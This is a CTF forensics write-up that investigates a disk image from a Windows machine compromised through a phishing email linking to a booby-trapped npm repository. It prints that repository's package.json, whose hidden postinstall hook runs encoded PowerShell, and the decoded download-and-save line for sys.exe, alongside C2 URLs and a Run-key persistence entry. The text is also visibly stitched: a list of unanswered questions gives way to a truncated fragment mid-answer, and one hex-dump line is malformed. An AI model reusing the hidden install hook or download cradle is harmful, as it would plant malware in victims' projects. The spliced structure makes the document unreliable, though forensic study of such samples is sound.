---
title: "Silent Visitor"
date: 2025-11-08 18:30:00 +0000
categories: [Writeups, Forensics, Securinets CTF 2025]
tags: [forensics, writeup]
---

### Description

A user reported suspicious activity on their Windows workstation. Can you investigate the incident and uncover what really happened?

`nc foren-1f49f8dc.p1.securinets.tn 1337`
### Handout

- test.ad1

### Solve 

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/silent-visitor$ ls
test.ad1
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/silent-visitor$ file test.ad1 
test.ad1: DIY-Thermocam raw data (Lepton 3.x), scale 6292-0, spot sensor temperature 0.000000, unit celsius, color scheme 4, maximum point enabled, calibration: offset 0.000000, slope 40564819207303340847894502572032.000000
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/silent-visitor$ xxd test.ad1 | head
00000000: 4144 5345 474d 454e 5445 4446 494c 4500  ADSEGMENTEDFILE.
00000010: 0100 0000 0200 0000 0100 0000 0100 0000  ................
00000020: 0000 c05d 0000 0000 0002 0000 0000 0000  ...]............
00000030: 0000 0000 0000 0000 00005 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

Autopsy is normally my go to on Linux machines to analyze disk images and navigate file systems in general, but unfortunately it doesn't support .ad1 format so we have to rely on a Windows tool called FTK Imager.

This challenge is a classic CTF forensics challenge where we must answer questions sequentially regarding evidence in the artifact file.

***What is the SHA256 hash of the disk image provided?***

The SHA256 hash of the disk image can be obtained with the sha256sum command:

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/silent-visitor$ sha256sum test.ad1 
122b2b4bf1433341ba6e8fefd707379a98e6e9ca376340379ea42edb31a5dba2  test.ad1
```

***Identify the OS build number of the victim’s system?***

The OS build number of a Windows system can be found by extracting the `SOFTWARE` hive at `C:\Windows\System32\config\SOFTWARE` and navigating to the registry key at `Microsoft\Windows NT\CurrentVersion`. We can navigate registry keys with tools like Registry Explorer.

`C:\Windows\System32\config\SOFTWARE`: this hive contains system-wide configuration data, including Windows version and build information

`Microsoft\Windows NT\CurrentVersion`: registry path where Windows stores OS version metadata

We then look for the `CurrentBuild` or `CurrentBuildNumber` key and find the corresponding value. In this case it was `19045`.


***What is the ip of the victim's machine?***

The IP of the machine can be found by extracting the `SYSTEM` hive at the same directory and navigating to the following registry key: `ControlSet001\Services\Tcpip\Parameters\Interfaces`. Among the several interfaces listed, we identify the one containing the `DhcpIPAddress` value: `192.168.206.131`.

***What is the name of the email application used by the victim?***

The main user of the Windows system is `ammar`. If we scroll through the user's AppData folder, which contains application data for installed programs, we will find the `Thunderbird` email application at `Users/ammar/AppData/Roaming`.


***What is the email of the victim?***

***What is the email of the attacker?***

***What is the URL that the attacker used to deliver the malware to the victim?***

***What is the SHA256 hash of the malware file?***

***What is the IP address of the C2 server that the malware communicates with?***

***What port does the malware use to communicate with its Command & Control (C2) server?***

***What is the url of the first Request made by the malware to the c2 server?***


***The malware created a file to identify itself. What is the content of that file?***

***Which registry key did the malware modify or add to maintain persistence?***

***What is the content of this registry?***

***The malware uses a secret token to communicate with the C2 server. What is the value of this key?***


od:**  
Following the same path as the previous question, I navigated to `Profiles/6red5uxz.default-release/ImapMail` and opened the `INBOX` file, which contains all email messages. Within the message headers, I identified the victim's email address:

```
(...)
From - Sat Apr 05 17:44:36 2025
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Delivered-To: ammar55221133@gmail.com
Received: by 2002:a05:6000:124e:b0:38f:64da:99dc with SMTP id j14csp3962225wrx;
        Fri, 4 Apr 2025 13:56:04 -0700 (PDT)
(...)
```

**Answer:**  
`ammar55221133@gmail.com`

### Q6: What is the email address of the attacker?

**Method:**  
Continuing my analysis of the `INBOX` file, I located the sender's email address in the message headers:

```
(...)
From: mohamed Masmoudi <masmoudim522@gmail.com>
Date: Sat, 5 Apr 2025 16:44:43 +0100
X-Gm-Features: ATxdqUGlTxHBoctjapTkbhZFCt6GSzpFeQniEJ2vngCwJ0yIpuCaoNoB4aADUSE
Message-ID: <CAJwm=77ngOVR=zxaYaB78WHQ=NebedFi1stLmNCYp-biF+Qm5g@mail.gmail.com>
Subject: run this
To: ammar55221133@gmail.com
(...)
```

**Answer:**  
`masmoudim522@gmail.com`

### Q7: What is the URL that the attacker used to deliver the malware to the victim?

**Method:**  
In the body of the attacker's email, I found a link to a GitHub repository:

```
(...)
--000000000000584e4d063209e2fb
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hey hey!

Just pushed up the starter code here:
=F0=9F=91=89 https://github.com/lmdr7977/student-api

You can just clone it and run npm install, then npm run dev to get it
going. Should open on port 3000.

I set up a couple of helpful scripts in there too, so feel free to tweak
whatever.

Lmk if anything=E2=80=99s broken =F0=9F=98=85
(...)
```

At first glance, this repository might seem like the answer. However, further investigation was necessary to find the actual malware delivery URL.

I examined the repository's `package.json` file and discovered a PowerShell command embedded in the postinstall script:

```json
{
  "name": "windows",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "postinstall": "powershell -NoLogo -NoProfile -WindowStyle Hidden -EncodedCommand \"JAB3ACAAPQAgACIASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACIAOwAKACQAdQAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwB0AG0AcABmAGkAbABlAHMALgBvAHIAZwAvAGQAbAAvADIAMwA4ADYAMAA3ADcAMwAvAHMAeQBzAC4AZQB4AGUAIgA7AAoAJABvACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABzAHkAcwAuAGUAeABlACIAOwAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAbwA=\""
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "description": "",
  "dependencies": {
    "child_process": "^1.0.2",
    "express": "^5.1.0",
    "path": "^0.12.7"
  }
}
```

The command was Base64-encoded. After decoding it, I obtained the actual malware download URL:

```powershell
$w = "Invoke-WebRequest";
$u = "https://tmpfiles.org/dl/23860773/sys.exe";
$o = "$env:APPDATA\sys.exe";
Invoke-WebRequest $u -OutFile $o
```

**Answer:**  
`https://tmpfiles.org/dl/23860773/sys.exe`

### Q8: What is the SHA256 hash of the malware file?

**Method:**  
Based on the decoded PowerShell command, I knew the malware was saved to the victim's AppData folder. I navigated to `Users/ammar/AppData/Roaming` and located the `sys.exe` file, then calculated its SHA256 hash.

**Answer:**  
`BE4F01B3D537B17C5BA7DC1BB7CD4078251364398565A0CA1E96982CFF820B6D`

### Q9: What is the IP address of the C2 server that the malware communicates with?

**Method:**  
I submitted the malware hash to VirusTotal, which provided extensive information about the malware's behavior.

![alt text](images/4.png)

The analysis revealed that the malware contacts the following URLs:

```
http://40.113.161.85:5000/config
http://40.113.161.85:5000/heartbeat
http://40.113.161.85:5000/login
http://40.113.161.85:5000/tasks
http://40.113.161.85:5000/helppppiscofebabe23
```

**Answer:**  
`40.113.161.85`

### Q10: What port does the malware use to communicate with its Command & Control (C2) server?

**Method:**  
The port number is visible in the URLs identified in the previous question.

**Answer:**  
`5000`

### Q11: What is the URL of the first request made by the malware to the C2 server?

**Method:**  
From the VirusTotal analysis, I identified all HTTP requests made by the malware:

![alt text](images/5.png)

By testing each URL, I determined which one was contacted first.

**Answer:**  
`http://40.113.161.85:5000/helppppiscofebabe23`

### Q12: The malware created a file to identify itself. What is the content of that file?

**Method:**  
The VirusTotal analysis also revealed files written by the malware:

![alt text](images/6.png)

I navigated to `Users/Public/Documents/id.txt` on the disk image and examined its contents.

**Answer:**  
`3649ba90-266f-48e1-960c-b908e1f28aef`

### Q13: Which registry key did the malware modify or add to maintain persistence?

**Method:**  
VirusTotal provided information about registry modifications made by the malware. After testing the identified keys, I found the correct persistence mechanism on the first attempt.

**Answer:**  
`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyApp`

### Q14: What is the content of this registry key?

**Method:**  
To examine this registry key, I first extracted the `NTUSER.DAT` file from the `Users/ammar` directory using FTK Imager, then opened it in Registry Viewer to view the key's value.

![alt text](images/7.png)

**Answer:**  
`C:\Users\ammar\Documents\sys.exe`

### Q15: The malware uses a secret token to communicate with the C2 server. What is the value of this key?

**Method:**  
To find the secret token, I performed static analysis on the `sys.exe` malware file. Using the `strings` command with a grep filter, I searched for the term "secret":

```bash
strings sys.exe | grep secret
```

This revealed the token embedded in the build flags:

```
(...) build   -ldflags="-s -w -X main.secret=e7bcc0ba5fb1dc9cc09460baaa2a6986 -X main.ipC2=qukttvktstk}p -H windowsgui" (...)
```

**Answer:**  
`e7bcc0ba5fb1dc9cc09460baaa2a6986`

## Conclusion

By systematically answering all questions correctly, I successfully solved the challenge and obtained the flag!